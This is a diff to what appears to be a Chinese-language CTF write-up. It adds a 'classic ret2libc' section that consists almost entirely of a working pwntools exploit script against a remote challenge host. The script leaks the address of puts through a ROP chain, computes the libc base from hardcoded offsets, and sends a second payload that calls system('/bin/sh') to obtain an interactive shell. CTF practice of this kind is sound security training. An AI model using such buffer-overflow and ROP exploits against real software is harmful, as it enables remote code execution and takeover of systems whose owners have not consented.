@@ -187,6 +187,39 @@ p.interactive()
 
 
 
+## 三.经典ret2libc
+
+![image-20260313184227163](/images/image-20260313184227163.png)
+
+```
+from pwn import *
+from  LibcSearcher import *
+
+context(os='linux', arch='amd64', log_level='debug')
+p=remote('node7.anna.nssctf.cn',23312)
+
+elf=ELF('./1')
+
+def debug():
+    gdb.attach(p)
+    pause()
+
+def get_addr():
+    return u64(p.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))
+
+rdi=0x400763
+payload=b'a'*0x18 + p64(rdi) + p64(elf.got['puts']) + p64(elf.sym['puts']) + p64(elf.sym['vuln'])
+p.sendline(payload)
+
+libc_base = get_addr() - 0x06f6a0
+system = libc_base + 0x0453a0
+binsh = libc_base + 0x18ce57
+
+payload = b'a'*0x18 + p64(rdi) + p64(binsh) + p64(system) 
+p.sendline(payload)
+p.interactive()
+```
+
 
 
 
